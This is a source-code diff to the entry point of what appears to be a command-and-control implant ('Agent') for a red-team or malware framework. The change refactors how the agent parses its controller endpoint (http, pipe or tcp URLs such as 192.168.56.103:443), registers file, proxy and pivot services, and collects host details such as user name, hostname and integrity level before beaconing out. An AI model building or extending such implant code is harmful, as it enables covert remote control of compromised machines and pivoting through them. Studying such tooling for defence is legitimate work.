@@ -1,4 +1,6 @@
-﻿using Agent.Models;
+﻿using Agent.Communication;
+using Agent.Models;
+using Agent.Service;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -13,8 +15,6 @@ namespace Agent
     class Program
     {
 
-        private static AgentMetadata s_metadata;
-
         static void Main(string[] args)
         {
 
@@ -23,53 +23,47 @@ namespace Agent
 #endif
 
 #if DEBUG
-            //if (args.Count() == 0)
-            //    args = new string[] { "https:192.168.56.103:443"/*, "pipe:id"*/ };
-                //args = new string[] { "pipe:aaaaaaaaaa" };
+            if (args.Count() == 0)
+                //args = new string[] { "http://192.168.56.103:443" };
+                //args = new string[] { "pipe://192.168.56.103:aaaaaaaaaa" };
+                args = new string[] { "tcp://127.0.0.1:4343" };
 #endif
+            if (args.Count() == 0)
+            {
+                Debug.WriteLine("No Endpoint set, quitting...");
+                return;
+            }
+
+            string connUrl = args[0];
+            var connexion = ConnexionUrl.FromString(connUrl);
+
+            if (!connexion.IsValid)
+            {
+                Debug.WriteLine($"Endpoint {connUrl} is not valid, quiiting...");
+                return;
+            }
+
+            var metaData = GenerateMetadata(connexion.ToString());
 
 
-            GenerateMetadata();
 
-            var agent = new Models.Agent(s_metadata);
+            ServiceProvider.RegisterSingleton<IMessageService>(new MessageService(metaData));
+            ServiceProvider.RegisterSingleton<IFileService>(new FileService());
+            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
+
+            ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
+
+
+            var commModule = CommunicationFactory.CreateCommunicator(connexion);
+            var agent = new Models.Agent(metaData, commModule);
 
             Thread agentThread = new Thread(agent.Start);
             agentThread.Start();
-
-            foreach (var arg in args)
-            {
-                var tab = arg.Split(':');
-                //Http communicator
-                if ((tab.Length == 2 || tab.Length == 3) && (tab[0] == "http" || tab[0] == "https"))
-                {
-                    string protocol = tab[0];
-                    string server = tab[1];
-                    int port = tab.Length > 2 ? Convert.ToInt32(tab[2]) : tab[0] == "http" ? 80 : 443;
-
-                    agent.HttpCommunicator.Init(protocol, server, port);
-                    agent.HttpCommunicator.Start();
-                }
-
-                //Pipe Communicator
-                if (tab.Length == 2 && tab[0] == "pipe")
-                {
-                    s_metadata.Id = tab[1];
-                    agent.PipeCommunicator.Init(s_metadata.Id);
-                }
-                else
-                {
-                    agent.PipeCommunicator.Init();
-                }
-            }
-
-            agent.PipeCommunicator.Start();
-
-
             agentThread.Join();
         }
 
 
-        static void GenerateMetadata()
+        static AgentMetadata GenerateMetadata(string endpoint)
         {
             var process = Process.GetCurrentProcess();
             var userName = Environment.UserName;
@@ -86,7 +80,7 @@ namespace Agent
                 }
             }
 
-            s_metadata = new AgentMetadata()
+            AgentMetadata metadata = new AgentMetadata()
             {
                 Id = ShortGuid.NewGuid(),
                 Hostname = Environment.MachineName,
@@ -95,8 +89,11 @@ namespace Agent
                 ProcessName = process.ProcessName,
                 Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
                 Integrity = integrity,
+                EndPoint = endpoint,
+                Version = "Net v6.0",
             };
 
+            return metadata;
         }
     }
 }
